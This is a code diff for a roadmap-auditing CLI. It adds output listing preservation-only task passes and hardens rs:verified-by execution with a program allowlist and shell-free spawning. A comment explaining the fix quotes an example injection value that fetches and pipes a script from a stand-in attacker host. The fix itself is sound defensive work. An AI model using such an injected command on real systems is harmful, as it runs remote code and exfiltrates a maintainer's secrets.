@@ -177,6 +177,17 @@ function printAudit(audit, context) {
       console.log(`- [${item.task.id}] ${item.task.text}`);
     });
   }
+  // v0.13.1: surface [x] tasks that passed only because their state was preserved (no evidence found).
+  if (Array.isArray(audit.preservedOnly) && audit.preservedOnly.length > 0) {
+    console.log(`Preserved only (no evidence found, checked state trusted): ${audit.preservedOnly.length}`);
+    console.log(`  Add --strict to reject preservation-only passes, or add rs:kind=manual to attest explicitly.`);
+    audit.preservedOnly.slice(0, 10).forEach((item) => {
+      console.log(`- [${item.task.id}] ${item.task.text}`);
+    });
+    if (audit.preservedOnly.length > 10) {
+      console.log(`  ...and ${audit.preservedOnly.length - 10} more.`);
+    }
+  }
 }
 
 // ─── runUpdate ────────────────────────────────────────────────────────────────
@@ -349,10 +360,29 @@ function runVerify(projectRoot, config, flags) {
   }
 
   const { spawnSync } = require('child_process');
-  const isWin = process.platform === 'win32';
-  const spawned = spawnSync(cmd, {
+
+  // v0.13.1 security fix: rs:verified-by commands run without shell interpretation
+  // and are restricted to a small allowlist of build/test tools. A malicious ROADMAP.md
+  // shipped via PR would otherwise let `rs:verified-by=; curl attacker.com | sh` exfiltrate
+  // secrets on the maintainer's machine.
+  const VERIFY_ALLOWLIST = /^(npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tsc|eslint|prettier|make|cargo|go|dotnet|mvn|gradle|bundle|rake|ruby)$/;
+  const parts = String(cmd).trim().split(/\s+/).filter(Boolean);
+  const program = parts[0] || '';
+  const args = parts.slice(1);
+
+  if (!VERIFY_ALLOWLIST.test(program)) {
+    console.error(`rs:verified-by program "${program}" is not in the v0.13.1 allowlist.`);
+    console.error(`Allowed: ${VERIFY_ALLOWLIST.source}`);
+    console.error(`Wrap custom commands in an npm/yarn script and reference the script name.`);
+    process.exitCode = 1;
+    return;
+  }
+
+  console.error(`+ ${program} ${args.join(' ')}`);  // audit trail before execution
+
+  const spawned = spawnSync(program, args, {
     cwd: projectRoot,
-    shell: isWin ? true : '/bin/sh',
+    shell: false,
     encoding: 'utf8',
     timeout: 5 * 60 * 1000
   });
